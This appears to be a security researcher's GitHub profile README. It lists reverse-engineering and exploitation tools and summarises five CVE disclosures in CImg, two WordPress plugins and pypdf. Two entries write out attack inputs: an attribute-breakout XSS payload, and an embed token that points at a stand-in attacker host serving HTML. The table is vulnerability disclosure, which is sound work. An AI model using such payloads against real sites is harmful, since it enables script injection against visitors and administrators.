# manop55555

maybe 0 or 1

## Tools & Languages

[![Skills](https://skillicons.dev/icons?i=bash,c,cpp,go,git,linux,lua,perl,python,ruby,rust,vim,vscode,sublime&theme=dark)](https://skillicons.dev)

![ARM Assembly](https://img.shields.io/badge/ARM_Assembly-A0522D?style=flat-square&logoColor=white)
![Binary Ninja](https://img.shields.io/badge/Binary_Ninja-4B0082?style=flat-square&logoColor=white)
![checksec](https://img.shields.io/badge/checksec-444444?style=flat-square&logoColor=white)
![GDB](https://img.shields.io/badge/GDB-333333?style=flat-square&logoColor=white)
![GDB-PEDA](https://img.shields.io/badge/GDB--PEDA-555555?style=flat-square&logoColor=white)
![Ghidra](https://img.shields.io/badge/Ghidra-FF0000?style=flat-square&logoColor=white)
![IDA Pro](https://img.shields.io/badge/IDA_Pro-004B8D?style=flat-square&logoColor=white)
![ltrace](https://img.shields.io/badge/ltrace-555555?style=flat-square&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square&logoColor=white)
![NASM](https://img.shields.io/badge/NASM-333333?style=flat-square&logoColor=white)
![objdump](https://img.shields.io/badge/objdump-333333?style=flat-square&logoColor=white)
![one_gadget](https://img.shields.io/badge/one__gadget-FF4500?style=flat-square&logoColor=white)
![pwndbg](https://img.shields.io/badge/pwndbg-FF6600?style=flat-square&logoColor=white)
![pwntools](https://img.shields.io/badge/pwntools-4B0082?style=flat-square&logoColor=white)
![Radare2](https://img.shields.io/badge/Radare2-1A1A1A?style=flat-square&logoColor=white)
![readelf](https://img.shields.io/badge/readelf-222222?style=flat-square&logoColor=white)
![ROPgadget](https://img.shields.io/badge/ROPgadget-8B0000?style=flat-square&logoColor=white)
![Ropper](https://img.shields.io/badge/Ropper-CC0000?style=flat-square&logoColor=white)
![strace](https://img.shields.io/badge/strace-666666?style=flat-square&logoColor=white)
![strings](https://img.shields.io/badge/strings-555555?style=flat-square&logoColor=white)
![x86 Assembly](https://img.shields.io/badge/x86_Assembly-6E4C13?style=flat-square&logoColor=white)
![x86-64 Assembly](https://img.shields.io/badge/x86--64_Assembly-8B4513?style=flat-square&logoColor=white)

## CVE Disclosures

| CVE ID | Description | Severity |
|--------|-------------|:--------:|
| [CVE-2026-47667](https://github.com/GreycLab/CImg/security/advisories/GHSA-rmfc-grgj-qwhv) | CImg (<= 3.7.6). The `_load_analyze()` function reads the `header_size` field as an unsigned 32-bit integer from the first 4 bytes of a NIfTI/Analyze file and passes it directly to `new unsigned char[header_size]` without validating against the actual file size. A specially crafted file of only 6 bytes is enough to trigger an allocation of approximately 1.3 GB per call, and when the subsequent read fails the allocated buffer is never freed. An attacker who can feed an untrusted image file to an application using CImg can cause repeated memory exhaustion and denial of service | High |
| [CVE-2026-9104](https://github.com/dartiss/draft-list/security/advisories/GHSA-xxx9-hfqp-f83f) | WordPress Plugin Draft List (<= 2.6.3). When a site configures the `[drafts]` shortcode or Draft List widget with a custom `template` placing the `{{draft}}` placeholder inside an HTML attribute, the plugin substitutes the raw draft post title without escaping for viewers who lack edit permissions. A user with Contributor role can save a draft whose title contains a quote-only payload such as `x" onerror="alert(1)`, which breaks out of the surrounding attribute and executes arbitrary JavaScript in any visitor browsing the public page | Moderate |
| [CVE-2026-48093](https://github.com/dartiss/code-embed/security/advisories/GHSA-7c9x-px5v-5hcp) | WordPress Plugin Code Embed (<= 2.6). The plugin scans rendered post content for external URL embed tokens such as `{{https://attacker.example/payload.html}}`, performs a server-side HTTP request to the URL, and inserts the response body into the page without sanitization or an `unfiltered_html` capability check. A user with Contributor role can submit a pending post containing such a token pointing to an attacker-controlled host, and when an Administrator or Editor previews the post the returned HTML executes arbitrary JavaScript in the reviewer browser session | Moderate |
| [CVE-2026-48735](https://github.com/py-pdf/pypdf/security/advisories/GHSA-wjqc-6w8f-h24c) | pypdf (< 6.12.1). The XMP metadata parser does not impose any size or complexity limits on the metadata stream embedded in a PDF document. An attacker who can supply an untrusted PDF to an application using pypdf can craft a document containing very large XMP metadata, often padded with large numbers of unnecessary elements, causing pypdf to consume excessive memory while parsing and exhaust the available RAM, resulting in denial of service | Moderate |
| [CVE-2025-10181](https://github.com/dartiss/draft-list/security/advisories/GHSA-jf7w-cp2r-c3jh) | WordPress Plugin Draft List (<= 2.6). The plugin `drafts` shortcode does not sufficiently sanitize and escape user-supplied attributes before rendering them on the page. A user with Contributor role or higher can inject arbitrary web scripts through these attributes, and the injected payload is stored and executed every time another user visits a page containing the affected shortcode | Moderate |
